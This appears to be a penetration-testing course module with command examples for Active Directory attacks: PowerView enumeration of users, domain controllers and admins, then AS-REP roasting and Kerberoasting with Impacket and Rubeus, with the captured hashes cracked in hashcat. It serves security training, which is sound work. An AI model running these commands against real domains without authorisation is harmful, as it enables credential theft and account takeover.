# Module 17: Active Directory I Examples

## 1. Domain Enumeration (PowerView)

PowerView is a powerful PowerShell script for AD enumeration.

```powershell
# Load PowerView
Import-Module .\PowerView.ps1

# Get all users in the domain
Get-NetUser

# Find domain controllers
Get-NetDomainController

# Find domain admins
Get-NetGroupMember -GroupName "Domain Admins"

# Find GPOs
Get-NetGPO
```

## 2. AS-REP Roasting

Targeting users with "Do not require Kerberos preauthentication" enabled.

**Using Impacket (Linux):**
```bash
# Enumerate and capture AS-REP hashes
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.10.100

# Crack the hash using Hashcat (Mode 18200)
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Using Rubeus (Windows):**
```cmd
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
```

## 3. Kerberoasting

Targeting service accounts with Service Principal Names (SPNs) set. Any authenticated domain user can request these tickets.

**Using Impacket (Linux):**
```bash
# Request TGS tickets for accounts with SPNs
impacket-GetUserSPNs domain.local/user:password -request -dc-ip 10.10.10.100 -outputfile kerberoast_hashes.txt

# Crack the hash using Hashcat (Mode 13100 for Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Using Rubeus (Windows):**
```cmd
Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt
```
